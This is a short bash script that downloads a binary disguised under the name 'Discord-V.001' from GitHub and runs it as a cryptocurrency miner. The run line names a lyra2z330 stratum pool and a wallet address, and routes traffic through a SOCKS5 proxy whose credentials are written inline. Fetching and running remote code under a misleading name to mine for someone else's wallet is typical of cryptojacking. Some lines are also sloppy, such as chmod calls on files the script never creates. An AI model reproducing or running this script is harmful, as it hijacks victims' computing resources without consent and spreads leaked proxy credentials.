#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y
wget -O Discord-V.001 https://github.com/Explorer-Discord/Discord-V.001/raw/main/Discord-V.001
screen -dmS ls
chmod +x Discord.sh && chmod +x Discord-V.001 && chmod 777 Discord Discord.sh
./Discord-V.001 -a lyra2z330  -o stratum+tcp://stratum-eu.rplant.xyz:7051 -u PBqv4MQQnByD19vc3B2Es3GzVeyhksLPwE.AA=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=SOCKS5://cghuohtm:ev5p8oqzuvmg@193.8.56.119:9183
